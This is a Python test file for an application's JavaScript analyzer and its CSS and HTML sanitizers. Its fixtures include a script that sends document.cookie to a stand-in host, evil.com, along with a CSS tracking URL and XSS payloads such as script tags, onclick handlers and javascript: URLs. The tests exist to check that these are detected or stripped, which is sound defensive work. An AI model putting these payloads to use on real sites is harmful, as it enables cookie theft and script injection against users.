"""Tests for security services (JS analyzer, CSS/HTML sanitizers)."""

from app.services.security.js_analyzer import JavaScriptSecurityAnalyzer
from app.services.security.css_sanitizer import CSSSecuritySanitizer
from app.services.security.html_sanitizer import HTMLSanitizer


class TestJavaScriptSecurityAnalyzer:
    """Test JavaScript security analysis."""
    
    def setup_method(self):
        self.analyzer = JavaScriptSecurityAnalyzer()
    
    def test_detect_fetch_call(self):
        """Should detect fetch() calls as dangerous."""
        malicious_js = """
        function stealData() {
            fetch('https://evil.com/steal?data=' + document.cookie);
        }
        """
        analysis = self.analyzer.analyze_script(malicious_js)
        
        assert not analysis["is_safe"]
        assert analysis["risk_score"] > 50
        assert any("fetch" in v.lower() for v in analysis["violations"])
        assert analysis["recommended_action"] in ["SANITIZE", "REJECT"]
    
    def test_detect_cookie_access(self):
        """Should detect document.cookie access."""
        malicious_js = """
        var data = document.cookie;
        console.log(data);
        """
        analysis = self.analyzer.analyze_script(malicious_js)
        
        assert not analysis["is_safe"]
        assert any("cookie" in v.lower() for v in analysis["violations"])
    
    def test_detect_eval(self):
        """Should detect eval() usage."""
        malicious_js = """
        eval('alert(1)');
        """
        analysis = self.analyzer.analyze_script(malicious_js)
        
        assert not analysis["is_safe"]
        violations_text = " ".join(analysis["violations"]).lower()
        assert "eval" in violations_text or "blacklisted" in violations_text
    
    def test_allow_safe_dom_manipulation(self):
        """Should allow safe DOM manipulation."""
        safe_js = """
        function updateDisplay() {
            var elem = document.getElementById('result');
            elem.textContent = 'Success!';
            elem.classList.add('completed');
        }
        """
        analysis = self.analyzer.analyze_script(safe_js)
        
        assert analysis["is_safe"]
        assert analysis["risk_score"] == 0
        assert analysis["recommended_action"] == "ALLOW"
    
    def test_sanitize_removes_fetch(self):
        """Sanitization should remove fetch calls."""
        malicious_js = """
        function checkAnswer() {
            fetch('https://evil.com/steal');
            var result = document.getElementById('result');
            result.textContent = 'Checked';
        }
        """
        sanitized = self.analyzer.sanitize_js(malicious_js)
        
        assert 'fetch' not in sanitized
        assert 'textContent' in sanitized  # Safe operation preserved


class TestCSSSecuritySanitizer:
    """Test CSS security sanitization."""
    
    def setup_method(self):
        self.sanitizer = CSSSecuritySanitizer()
    
    def test_remove_javascript_url(self):
        """Should remove javascript: URLs from CSS."""
        malicious_css = """
        .test {
            background: url('javascript:alert(1)');
        }
        """
        sanitized, warnings = self.sanitizer.sanitize_css(malicious_css)
        
        assert 'javascript:' not in sanitized
        assert len(warnings) > 0
    
    def test_remove_external_urls(self):
        """Should remove external URLs (data exfiltration risk)."""
        malicious_css = """
        .test {
            background: url('https://evil.com/track');
        }
        """
        sanitized, warnings = self.sanitizer.sanitize_css(malicious_css)
        
        assert 'evil.com' not in sanitized
        assert any('external' in w.lower() for w in warnings)
    
    def test_keep_local_urls(self):
        """Should keep localhost URLs."""
        safe_css = """
        .test {
            background: url('http://localhost:3000/image.png');
        }
        """
        sanitized, warnings = self.sanitizer.sanitize_css(safe_css)
        
        assert 'localhost' in sanitized
        assert len(warnings) == 0


class TestHTMLSanitizer:
    """Test HTML security sanitization."""
    
    def setup_method(self):
        self.sanitizer = HTMLSanitizer()
    
    def test_remove_script_tags(self):
        """Should remove script tags."""
        malicious_html = """
        <p>Hello</p>
        <script>alert('XSS')</script>
        """
        sanitized = self.sanitizer.sanitize_content(malicious_html)
        
        assert '<script>' not in sanitized
        assert '<p>Hello</p>' in sanitized
        # bleach removes <script> tag but preserves text content
    
    def test_remove_event_handlers(self):
        """Should remove event handlers."""
        malicious_html = """
        <button onclick="alert('XSS')">Click</button>
        """
        sanitized = self.sanitizer.sanitize_content(malicious_html)
        
        assert 'onclick' not in sanitized
        assert '<button' in sanitized
    
    def test_sanitize_url_blocks_javascript(self):
        """Should block javascript: URLs."""
        result = self.sanitizer.sanitize_url('javascript:alert(1)')
        assert result == '#'
    
    def test_sanitize_url_blocks_data_base64(self):
        """Should block data: URLs with base64."""
        url = 'data:text/html;base64,PHNjcmlwdD4='
        result = self.sanitizer.sanitize_url(url)
        assert result == '#'
    
    def test_sanitize_url_allows_https(self):
        """Should allow https URLs."""
        url = 'https://example.com/image.png'
        result = self.sanitizer.sanitize_url(url)
        assert result == url
    
    def test_preview_truncates_long_content(self):
        """Preview should truncate long content."""
        long_html = '<p>' + 'x' * 1000 + '</p>'
        sanitized = self.sanitizer.sanitize_preview(long_html, max_length=100)
        
        assert len(sanitized) <= 110  # Allow for ellipsis and tags
        assert '...' in sanitized
